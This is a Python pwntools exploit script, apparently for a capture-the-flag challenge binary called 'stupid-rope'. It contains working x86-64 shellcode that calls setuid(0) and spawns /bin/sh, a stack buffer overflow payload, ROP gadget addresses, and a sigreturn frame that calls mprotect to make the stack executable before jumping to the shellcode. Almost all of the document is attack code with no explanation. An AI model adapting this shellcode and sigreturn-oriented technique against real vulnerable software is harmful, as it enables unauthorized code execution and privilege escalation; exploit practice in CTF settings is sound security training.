from pwn import *

# -#-#-#-#-#-#-#-#-#-#-#-#-#- # some prep
context.clear(arch="amd64")
con = process("/chall/stupid-rope")  
# -#-#-#-#-#-#-#-#-#-#-#-#-#- # ROP-gadgets
syscall         = 0x00000000004005a5
mov_eax_15      = 0x000000000040058c

# -#-#-#-#-#-#-#-#-#-#-#-#-#- # leak
leak            = con.recv().split("->")[1].split("\n")[0]
stack_adr       = int(leak[:-3] + "000", 16)
shellcode_adr   = int(leak, 16)
# -#-#-#-#-#-#-#-#-#-#-#-#-#- # exploit
shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"\
        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"\
        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"\
        "\x58\x0f\x05"\

# shellcode(x) + waste(buffer_size_256 - x) + rbp_placeholder(8)
payload = shellcode + "A" * (256 - len(shellcode)) + "B" * 8
payload += p64(mov_eax_15)
payload += p64(syscall)     # sigreturn syscall

# creating sigreturn frame
frame = SigreturnFrame(kernel="amd64")  
frame.rax = 10
frame.rdi = stack_adr
frame.rsi = 1024
frame.rdx = 7
frame.rsp = shellcode_adr + len(payload) + 248
frame.rip = syscall    # mprotect(void *stack_addr, size_t len(1024), int perm(rwx) -> disable 
# generating final payload
payload += str(frame)
payload += p64(shellcode_adr)

# getting our shell
con.sendline(payload)
con.interactive()
